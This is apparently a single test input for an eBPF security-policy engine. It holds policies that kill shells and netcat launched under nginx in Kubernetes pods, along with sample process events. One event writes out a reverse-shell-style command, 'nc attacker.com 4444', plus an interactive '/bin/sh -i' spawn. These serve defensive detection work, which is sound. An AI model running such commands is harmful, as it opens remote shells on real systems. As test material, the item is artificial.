    "input": "{\"policies\": [{\"policy_id\": \"kill_shell_spawned_by_web\", \"hook\": \"bpf_lsm_bprm_check_security\", \"match\": {\"cgroup_pattern\": \"k8s-pod-*\", \"process_binary_pattern\": \"*/nginx*\", \"target_path_pattern\": \"*/sh\"}, \"action\": \"KILL_PROCESS\", \"severity\": \"CRITICAL\"}, {\"policy_id\": \"kill_shell_from_web_ancestor\", \"hook\": \"bpf_lsm_bprm_check_security\", \"match\": {\"cgroup_pattern\": \"k8s-pod-*\", \"ancestor_binary_pattern\": \"*/nginx*\", \"target_path_pattern\": \"*/nc*\"}, \"action\": \"KILL_PROCESS\", \"severity\": \"CRITICAL\"}], \"processes\": {\"200\": {\"comm\": \"nginx\", \"binary_path\": \"/usr/sbin/nginx\", \"ppid\": 1, \"cgroup\": \"k8s-pod-ingress\", \"uid\": 33, \"gid\": 33}, \"201\": {\"comm\": \"helper\", \"binary_path\": \"/app/helper\", \"ppid\": 200, \"cgroup\": \"k8s-pod-ingress\", \"uid\": 33, \"gid\": 33}}, \"events\": [{\"event_id\": \"ev_exec_sh\", \"pid\": 200, \"hook\": \"bpf_lsm_bprm_check_security\", \"details\": {\"executable_path\": \"/bin/sh\", \"args\": [\"-i\"]}}, {\"event_id\": \"ev_exec_nc\", \"pid\": 201, \"hook\": \"bpf_lsm_bprm_check_security\", \"details\": {\"executable_path\": \"/usr/bin/nc\", \"args\": [\"attacker.com\", \"4444\"]}}]}",
